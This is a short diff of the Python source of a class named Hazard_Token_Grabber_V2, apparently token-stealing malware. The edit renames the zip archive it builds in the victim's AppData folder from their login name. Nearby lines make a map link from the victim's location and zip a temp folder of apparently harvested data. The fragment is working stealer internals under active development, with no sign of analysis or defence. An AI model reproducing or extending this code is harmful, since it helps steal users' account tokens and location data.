@@ -397,7 +397,7 @@ class Hazard_Token_Grabber_V2:
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception:
             pass
-        _zipfile = os.path.join(self.appdata, f'lroxyhesapbilgi-[{os.getlogin()}].zip')
+        _zipfile = os.path.join(self.appdata, f'-[{os.getlogin()}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
